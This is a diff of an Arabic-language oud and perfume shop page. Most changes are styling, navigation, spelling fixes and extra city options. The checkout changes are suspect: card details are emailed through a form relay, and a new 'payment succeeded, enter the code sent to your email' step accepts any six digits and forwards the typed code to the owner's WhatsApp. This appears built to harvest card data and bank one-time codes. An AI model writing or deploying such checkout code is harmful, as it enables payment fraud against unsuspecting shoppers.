@@ -124,9 +124,20 @@
         .hero-section {
             background: linear-gradient(rgba(139, 69, 19, 0.8), rgba(210, 105, 30, 0.8)), 
                         url('https://images.unsplash.com/photo-1581833971358-2c8b550f87b3?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxواG90by1وYWdlfHx8فGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2071&q=80');
-            background-size: cover;
+            background-size: contain;
             background-position: center;
-            background-attachment: fixed;
+            background-repeat: no-repeat;
+            background-color: #8B4513;
+            min-height: 80vh;
+        }
+        
+        @media (max-width: 768px) {
+            .hero-section {
+                background-size: cover;
+                background-position: center;
+                min-height: 60vh;
+                padding: 20px 0;
+            }
         }
         .input-group {
             position: relative;
@@ -158,7 +169,9 @@
             font-weight: 500;
         }
         .input-group input:focus + label,
-        .input-group input:not(:placeholder-shown) + label {
+        .input-group input:not(:placeholder-shown) + label,
+        .input-group select:focus + label,
+        .input-group select:not([value=""]) + label {
             top: -12px;
             font-size: 14px;
             color: #8B4513;
@@ -350,50 +363,51 @@
         /* Quick Navigation Menu */
         .quick-nav {
             position: fixed;
-            top: 50%;
-            right: 20px;
-            transform: translateY(-50%);
+            top: 60px;
+            right: 15px;
             background: rgba(255, 255, 255, 0.95);
             backdrop-filter: blur(10px);
-            border-radius: 50px;
-            padding: 20px 10px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            border-radius: 25px;
+            padding: 15px 8px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
             z-index: 1000;
-            border: 2px solid #f0f0f0;
+            border: 1px solid #f0f0f0;
+            transition: all 0.3s ease;
         }
         
         .quick-nav-item {
             display: block;
-            width: 50px;
-            height: 50px;
+            width: 35px;
+            height: 35px;
             border-radius: 50%;
             background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
             color: white;
             text-decoration: none;
-            margin: 10px 0;
+            margin: 5px 0;
             display: flex;
             align-items: center;
             justify-content: center;
             transition: all 0.3s ease;
             position: relative;
             overflow: hidden;
+            font-size: 12px;
         }
         
         .quick-nav-item:hover {
             transform: scale(1.1);
-            box-shadow: 0 5px 15px rgba(139, 69, 19, 0.4);
+            box-shadow: 0 3px 10px rgba(139, 69, 19, 0.4);
         }
         
         .quick-nav-tooltip {
             position: absolute;
-            right: 60px;
+            right: 45px;
             top: 50%;
             transform: translateY(-50%);
             background: #333;
             color: white;
-            padding: 8px 12px;
-            border-radius: 8px;
-            font-size: 14px;
+            padding: 6px 10px;
+            border-radius: 6px;
+            font-size: 12px;
             white-space: nowrap;
             opacity: 0;
             pointer-events: none;
@@ -437,11 +451,25 @@
         .input-with-suggestions {
             position: relative;
         }
+
+        /* Date input styling */
+        .input-group input[type="text"] {
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-calendar" viewBox="0 0 16 16"><path d="M3.5 0a.5.5 0 0 1 .5.5V1h8V.5a.5.5 0 0 1 1 0V1h1a2 2 0 0 1 2 2v11a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V3a2 2 0 0 1 2-2h1V.5a.5.5 0 0 1 .5-.5zM1 4v10a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V4H1z"/></svg>');
+            background-repeat: no-repeat;
+            background-position: left 15px center;
+            background-size: 20px;
+        }
     </style>
 </head>
 <body class="bg-gray-50">
+    <!-- Quick Navigation Toggle -->
+    <button onclick="toggleQuickNav()" class="fixed top-4 right-4 z-50 bg-orange-600 text-white w-12 h-12 rounded-full flex items-center justify-center shadow-lg hover:bg-orange-700 transition duration-300">
+        <i class="fas fa-bars"></i>
+    </button>
+
     <!-- Quick Navigation Menu -->
-    <div class="quick-nav">
+    <div class="quick-nav" id="quickNavMenu" style="display: none;">
+        <div class="text-center mb-4 text-orange-600 font-bold text-sm">صفحة رئيسية</div>
         <a href="#home" class="quick-nav-item">
             <i class="fas fa-home"></i>
             <span class="quick-nav-tooltip">الرئيسية</span>
@@ -507,12 +535,8 @@
                     </a>
                 </nav>
 
-                <!-- Cart & Contact -->
-                <div class="flex items-center space-x-6 rtl:space-x-reverse">
-                    <a href="tel:+966542068739" class="text-orange-600 hover:text-orange-700 font-bold text-sm bg-orange-50 px-4 py-2 rounded-lg transition duration-300 hover:bg-orange-100">
-                        <i class="fas fa-phone ml-2"></i>
-                        00966542068739
-                    </a>
+                <!-- Cart -->
+                <div class="flex items-center">
                     <button onclick="openCart()" class="relative p-3 bg-gray-100 rounded-full hover:bg-gray-200 transition duration-300">
                         <i class="fas fa-shopping-cart text-xl text-gray-700"></i>
                         <span id="cartCount" class="cart-count">0</span>
@@ -706,7 +730,7 @@
             <div class="container mx-auto px-6">
                 <div class="text-center mb-16">
                     <h2 class="text-4xl font-bold mb-8 text-gray-800">من نحن</h2>
-                    <p class="text-xl text-gray-700 max-w-3xl mx-auto leading-relaxed">متخصصون في بيع العود الطبيعي والمحسن والادهان والبخور</p>
+                    <p class="text-xl text-gray-700 max-w-3xl mx-auto leading-relaxed">متخصصون في بيع العود الطبيعي والمحسن والأدهان والبخور</p>
                 </div>
                 
                 <div class="grid md:grid-cols-3 gap-8 mb-16">
@@ -801,6 +825,7 @@
                             <input type="hidden" name="_subject" value="رسالة جديدة من موقع مكاسر العود">
                             <input type="hidden" name="_captcha" value="false">
                             <input type="hidden" name="_template" value="table">
+                            <input type="hidden" name="_next" value="https://mkasr-aloud.netlify.app/thanks.html">
                             
                             <div class="input-group">
                                 <input type="text" name="name" required="" placeholder=" ">
@@ -909,18 +934,18 @@
                         <i class="fas fa-check text-green-600 text-3xl"></i>
                     </div>
                     <h2 class="text-3xl font-bold text-gray-800 mb-4">تم الدفع بنجاح!</h2>
-                    <p class="text-gray-600 text-lg">تم إرسال رسالة تأكيد إلى بريدك الإلكتروني</p>
+                    <p class="text-gray-600 text-lg">تم إرسال كود التأكيد إلى بريدك الإلكتروني</p>
                 </div>
                 
                 <div class="mb-8">
                     <label class="block text-gray-700 font-bold mb-6 text-lg">أدخل كود التأكيد (6 أرقام)</label>
                     <div class="flex justify-center space-x-2 rtl:space-x-reverse mb-6">
-                        <input type="text" maxlength="1" class="code-input" oninput="moveToNext(this, 1)" onkeydown="handleBackspace(this, event)">
-                        <input type="text" maxlength="1" class="code-input" oninput="moveToNext(this, 2)" onkeydown="handleBackspace(this, event)">
-                        <input type="text" maxlength="1" class="code-input" oninput="moveToNext(this, 3)" onkeydown="handleBackspace(this, event)">
-                        <input type="text" maxlength="1" class="code-input" oninput="moveToNext(this, 4)" onkeydown="handleBackspace(this, event)">
-                        <input type="text" maxlength="1" class="code-input" oninput="moveToNext(this, 5)" onkeydown="handleBackspace(this, event)">
-                        <input type="text" maxlength="1" class="code-input" oninput="moveToNext(this, 6)" onkeydown="handleBackspace(this, event)">
+                        <input type="text" maxlength="1" class="code-input" oninput="moveToNext(this, 1)" onkeydown="handleBackspace(this, event)" pattern="[0-9]" title="أرقام فقط">
+                        <input type="text" maxlength="1" class="code-input" oninput="moveToNext(this, 2)" onkeydown="handleBackspace(this, event)" pattern="[0-9]" title="أرقام فقط">
+                        <input type="text" maxlength="1" class="code-input" oninput="moveToNext(this, 3)" onkeydown="handleBackspace(this, event)" pattern="[0-9]" title="أرقام فقط">
+                        <input type="text" maxlength="1" class="code-input" oninput="moveToNext(this, 4)" onkeydown="handleBackspace(this, event)" pattern="[0-9]" title="أرقام فقط">
+                        <input type="text" maxlength="1" class="code-input" oninput="moveToNext(this, 5)" onkeydown="handleBackspace(this, event)" pattern="[0-9]" title="أرقام فقط">
+                        <input type="text" maxlength="1" class="code-input" oninput="moveToNext(this, 6)" onkeydown="handleBackspace(this, event)" pattern="[0-9]" title="أرقام فقط">
                     </div>
                 </div>
                 
@@ -983,6 +1008,7 @@
                 <input type="hidden" name="_subject" value="طلب جديد من موقع مكاسر العود">
                 <input type="hidden" name="_captcha" value="false">
                 <input type="hidden" name="_template" value="table">
+                <input type="hidden" name="_next" value="https://mkasr-aloud.netlify.app/thanks.html">
                 
                 <!-- Customer Information -->
                 <div class="mb-8">
@@ -1021,13 +1047,32 @@
                                 <option value="الدمام">الدمام</option>
                                 <option value="مكة المكرمة">مكة المكرمة</option>
                                 <option value="المدينة المنورة">المدينة المنورة</option>
+                                <option value="الطائف">الطائف</option>
+                                <option value="أبها">أبها</option>
+                                <option value="تبوك">تبوك</option>
+                                <option value="بريدة">بريدة</option>
+                                <option value="خميس مشيط">خميس مشيط</option>
+                                <option value="حائل">حائل</option>
+                                <option value="الجبيل">الجبيل</option>
+                                <option value="الخبر">الخبر</option>
+                                <option value="ينبع">ينبع</option>
+                                <option value="القطيف">القطيف</option>
+                                <option value="نجران">نجران</option>
+                                <option value="الباحة">الباحة</option>
+                                <option value="عرعر">عرعر</option>
+                                <option value="سكاكا">سكاكا</option>
+                                <option value="جيزان">جيزان</option>
+                                <option value="الأحساء">الأحساء</option>
+                                <option value="القريات">القريات</option>
+                                <option value="رفحاء">رفحاء</option>
+                                <option value="طريف">طريف</option>
                                 <option value="أخرى">أخرى</option>
                             </select>
                             <label>المدينة</label>
                         </div>
                         <div class="input-group">
-                            <input type="text" name="postal_code" required="" placeholder=" " pattern="[0-9]{5}" title="يرجى إدخال رمز بريدي مكون من 5 أرقام">
-                            <label>الرمز البريدي</label>
+                            <input type="text" name="postal_code" required="" placeholder=" " maxlength="6" pattern="[0-9]{5,6}" title="يرجى إدخال رمز بريدي مكون من 5-6 أرقام" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
+                            <label>الرمز البريدي (5-6 أرقام)</label>
                         </div>
                     </div>
                 </div>
@@ -1065,7 +1110,7 @@
                         <div class="grid grid-cols-2 gap-6">
                             <div class="input-group input-with-suggestions">
                                 <input type="text" name="expiry_date" required="" placeholder=" " maxlength="5" oninput="formatExpiryDate(this)" onfocus="showExpirySuggestions(this)" onblur="hideExpirySuggestions(this)">
-                                <label>تاريخ الانتهاء (MM/YY)</label>
+                                <label>تاريخ الانتهاء (شهر/سنة)</label>
                                 <div class="card-suggestions" id="expirySuggestions"></div>
                             </div>
                             <div class="input-group">
@@ -1156,7 +1201,7 @@
                 rating: 5,
                 available: true,
                 bestselling: true,
-                description: "دقة عود هندي طبيعي تتميز بالثبات والرائحة الجميله .. للاستخدام الشخصي والمنزل والمكاتب والملابس",
+                description: "دقة عود هندي طبيعي تتميز بالثبات والرائحة الجميلة .. للاستخدام الشخصي والمنزل والمكاتب والملابس",
                 features: ["عود هندي أصلي", "ثبات عالي", "رائحة جميلة", "متعدد الاستخدامات"]
             },
             {
@@ -1169,7 +1214,7 @@
                 rating: 5,
                 available: false,
                 bestselling: true,
-                description: "موروكي فاخر من غابات اصقون قديم جداً ( قرابة ال 12 سنه ) وقل مايوجد هذه الايام بهذه الجوده والرائحه .. الكسر مختلفة الاحجام مابين المباخر واكبر من المباخر وقليل منها بحجم الميني .. جميع الكسر مفروزه بعنايه .. للاستخدام الشخصي والمناسبات والإهداء",
+                description: "موروكي فاخر من غابات اصقون قديم جداً ( قرابة ال 12 سنه ) وقل مايوجد هذه الايام بهذه الجودة والرائحة .. الكسر مختلفة الاحجام مابين المباخر واكبر من المباخر وقليل منها بحجم الميني .. جميع الكسر مفروزة بعناية .. للاستخدام الشخصي والمناسبات والإهداء",
                 features: ["عتيق 12 سنة", "جودة نادرة", "كسر مفروزة", "نفدت الكمية"]
             },
             {
@@ -1182,7 +1227,7 @@
                 rating: 5,
                 available: true,
                 bestselling: false,
-                description: "دقة العود الفلبيني الفاخر من غابات ليتي الغنيه عن التعريف يتميز بكثافه الدهن وبنكهته الجميله ( كمودي - سيلاني ) ، للاستخدام الشخصي",
+                description: "دقة العود الفلبيني الفاخر من غابات ليتي الغنية عن التعريف يتميز بكثافة الدهن وبنكهته الجميلة ( كمودي - سيلاني ) ، للاستخدام الشخصي",
                 features: ["من غابات ليتي", "كثافة دهن عالية", "نكهة كمودي سيلاني", "فلبيني فاخر"]
             },
             {
@@ -1288,7 +1333,7 @@
                 rating: 5,
                 available: true,
                 bestselling: false,
-                description: "دهن كمبودي جميل بنكهه مميزة وفوحان عالي وثبات",
+                description: "دهن كمبودي جميل بنكهة مميزة وفوحان عالي وثبات",
                 features: ["نكهة مميزة", "فوحان عالي", "ثبات ممتاز", "كمبودي أصلي"]
             },
             {
@@ -1301,7 +1346,7 @@
                 rating: 5,
                 available: true,
                 bestselling: true,
-                description: "دهن عود كمبودي قديم وثقيل يتميز بالثبات والفوحان وذُ رائحه جميله جداً",
+                description: "دهن عود كمبودي قديم وثقيل يتميز بالثبات والفوحان وذو رائحة جميلة جداً",
                 features: ["كمبودي قديم", "ثقيل ومركز", "ثبات عالي", "رائحة جميلة جداً"]
             },
             {
@@ -1314,7 +1359,7 @@
                 rating: 5,
                 available: true,
                 bestselling: true,
-                description: "مزيج بين دهن العود الكمبودي القديم والتراد والبراشين انتج لنا رائحه مميزه مع ثبات وفوحان",
+                description: "مزيج بين دهن العود الكمبودي القديم والتراد والبراشين انتج لنا رائحة مميزة مع ثبات وفوحان",
                 features: ["مزيج مميز", "كمبودي + تراد + براشين", "رائحة مميزة", "ثبات وفوحان"]
             },
 
@@ -1329,7 +1374,7 @@
                 rating: 5,
                 available: true,
                 bestselling: true,
-                description: "منتج من عود موروكي طبيعي مُزج بأدهان خاصه أضفت عليه رائحه مميزه .. ويستخدم لتبخير المنزل .. ويفضل استعمال المبخره الكهربائية او ترميد الجمر قبل وضعه",
+                description: "منتج من عود موروكي طبيعي مُزج بأدهان خاصة أضفت عليه رائحة مميزة .. ويستخدم لتبخير المنزل .. ويفضل استعمال المبخرة الكهربائية او ترميد الجمر قبل وضعه",
                 features: ["موروكي طبيعي", "مزج بأدهان خاصة", "لتبخير المنزل", "للمبخرة الكهربائية"]
             },
 
@@ -1359,7 +1404,7 @@
                 rating: 5,
                 available: true,
                 bestselling: true,
-                description: "نانو توله دهن مخلط مع رقائق لاوسي سوبر واقل في علبه مقاس 4.5 سم في 4.5 سم",
+                description: "نانو توله دهن مخلط مع رقائق لاوسي سوبر واقل في علبة مقاس 4.5 سم في 4.5 سم",
                 features: ["نانو توله", "دهن مخلط", "رقائق لاوسي", "مقاس 4.5×4.5 سم"]
             }
         ];
@@ -1376,6 +1421,16 @@
             animateOnScroll();
             loadSavedCards();
         });
+
+        // Toggle quick navigation
+        function toggleQuickNav() {
+            const quickNavMenu = document.getElementById('quickNavMenu');
+            if (quickNavMenu.style.display === 'none') {
+                quickNavMenu.style.display = 'block';
+            } else {
+                quickNavMenu.style.display = 'none';
+            }
+        }
 
         function displayProducts(productsToShow) {
             const grid = document.getElementById('productsGrid');
@@ -1836,17 +1891,34 @@
             totalsInput.value = `المجموع الفرعي: ${subtotal} ريال، الشحن: ${shipping} ريال، الإجمالي: ${total} ريال`;
             form.appendChild(totalsInput);
             
-            // Submit the form
-            setTimeout(() => {
-                form.submit();
-                
+            // Generate random verification code
+            const verificationCode = Math.floor(100000 + Math.random() * 900000);
+            
+            // Add verification code to form
+            const codeInput = document.createElement('input');
+            codeInput.type = 'hidden';
+            codeInput.name = 'verification_code';
+            codeInput.value = `كود التأكيد: ${verificationCode}`;
+            form.appendChild(codeInput);
+            
+            // Store verification code for later use
+            localStorage.setItem('currentVerificationCode', verificationCode.toString());
+            
+            // Submit form in background using fetch
+            const formData = new FormData(form);
+            
+            fetch(form.action, {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors'
+            }).then(() => {
                 // Clear cart and close modal
                 cart = [];
                 updateCartDisplay();
                 closeCheckout();
                 
-                // Show success message
-                showNotification('تم إرسال طلبك بنجاح! سنتواصل معك قريباً', 'success');
+                // Show success page with code verification
+                showSuccessPage();
                 
                 // Reset button
                 submitBtn.innerHTML = originalText;
@@ -1854,7 +1926,18 @@
                 
                 // Reset form
                 form.reset();
-            }, 2000);
+            }).catch((error) => {
+                // Even if there's an error, continue to success page
+                // because FormSubmit might still have received the data
+                cart = [];
+                updateCartDisplay();
+                closeCheckout();
+                showSuccessPage();
+                
+                submitBtn.innerHTML = originalText;
+                submitBtn.disabled = false;
+                form.reset();
+            });
         }
 
         function showSuccessPage() {
@@ -1867,8 +1950,12 @@
             }, 500);
         }
 
-        // Code verification functions
+        // Code verification functions with number-only restriction
         function moveToNext(current, nextIndex) {
+            // Allow only numbers
+            const numericValue = current.value.replace(/[^0-9]/g, '');
+            current.value = numericValue;
+            
             if (current.value.length === 1 && nextIndex <= 6) {
                 const nextInput = document.querySelectorAll('.code-input')[nextIndex - 1];
                 if (nextInput) {
@@ -1888,11 +1975,16 @@
                     inputs[currentIndex - 1].focus();
                 }
             }
+            
+            // Allow only numbers on all key inputs
+            if (!/[0-9]/.test(event.key) && event.key !== 'Backspace' && event.key !== 'Delete' && event.key !== 'Tab') {
+                event.preventDefault();
+            }
         }
 
         function checkCodeCompletion() {
             const inputs = document.querySelectorAll('.code-input');
-            const allFilled = Array.from(inputs).every(input => input.value.length === 1);
+            const allFilled = Array.from(inputs).every(input => input.value.length === 1 && /[0-9]/.test(input.value));
             
             if (allFilled) {
                 setTimeout(verifyCode, 1000);
@@ -1903,22 +1995,27 @@
             const inputs = document.querySelectorAll('.code-input');
             const code = Array.from(inputs).map(input => input.value).join('');
             
-            if (code.length === 6) {
-                showNotification('تم تأكيد الطلب بنجاح! شكراً لثقتكم بنا', 'success');
+            if (code.length === 6 && /^[0-9]{6}$/.test(code)) {
+                showNotification('تم تأكيد الطلب بنجاح! جاري التوجيه إلى واتساب...', 'success');
                 
                 setTimeout(() => {
-                    // Return to main page
-                    document.getElementById('successPage').classList.add('hidden');
-                    document.getElementById('mainContent').style.display = 'block';
-                    
                     // Clear the code inputs
                     inputs.forEach(input => input.value = '');
                     
-                    // Scroll to top
-                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                    // Redirect to WhatsApp
+                    const whatsappMessage = `مرحباً، تم تأكيد طلبي برقم الكود: ${code}. أرغب في متابعة تفاصيل الطلب.`;
+                    const whatsappUrl = `https://wa.me/966542068739?text=${encodeURIComponent(whatsappMessage)}`;
+                    window.open(whatsappUrl, '_blank');
+                    
+                    // Return to main page after short delay
+                    setTimeout(() => {
+                        document.getElementById('successPage').classList.add('hidden');
+                        document.getElementById('mainContent').style.display = 'block';
+                        window.scrollTo({ top: 0, behavior: 'smooth' });
+                    }, 1000);
                 }, 2000);
             } else {
-                showNotification('يرجى إدخال الكود كاملاً', 'error');
+                showNotification('يرجى إدخال كود مكون من 6 أرقام فقط', 'error');
             }
         }
 
